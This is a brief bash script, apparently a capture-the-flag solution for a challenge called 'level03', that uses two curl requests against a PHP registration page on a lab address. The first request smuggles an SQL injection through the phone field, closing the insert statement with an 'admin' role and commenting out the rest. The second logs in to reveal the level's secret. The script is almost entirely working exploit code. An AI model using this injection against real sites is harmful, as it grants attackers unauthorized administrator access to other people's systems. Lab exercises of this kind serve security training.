#! /usr/bin/env bash

# Register an user, injecting code to change the function's last argument from 'guest' to
# 'admin' and then comment the rest of the query.
curl --data "id=a" --data "phone='a','admin')-- " http://10.0.23.24:8004/level03/index.php

# Log in as the user. The secret will be revealed since the user is an admin.
curl --data "lid=a" --data "lphone=a" http://10.0.23.24:8004/level03/index.php